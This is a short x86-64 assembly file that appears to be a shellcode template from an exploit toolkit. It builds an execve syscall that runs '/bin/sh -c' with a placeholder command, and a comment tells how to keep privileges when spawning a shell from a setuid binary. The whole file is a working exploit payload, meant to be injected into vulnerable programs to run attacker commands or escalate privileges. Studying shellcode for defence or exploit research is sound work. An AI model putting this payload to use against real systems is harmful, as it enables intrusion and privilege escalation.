; execve("/bin//sh", ["sh", "-c" "$CMD$"], [NULL]), contains nulls, 41+cmdlen bytes
BITS 64
xor eax, eax
lea rdi, [rel bin]

push rax                ; NULL
push rsp
pop rdx                 ; envp -> [NULL]

lea rcx, [rdi+cmd-bin]
push rcx                ; "$CMD$"
lea rcx, [rdi+arg1-bin]
push rcx                ; "-c"
push rdi                ; "/bin/sh"
push rsp
pop rsi                 ; argv -> ["/bin/sh", "-c", "$CMD$", NULL]

mov al, 59              ; __NR_execve
syscall

; if you want to get a shell from a setuid binary, use -pc instead of -c
bin: db "/bin/sh", 0
arg1: db "-c", 0
cmd: db "$CMD$", 0
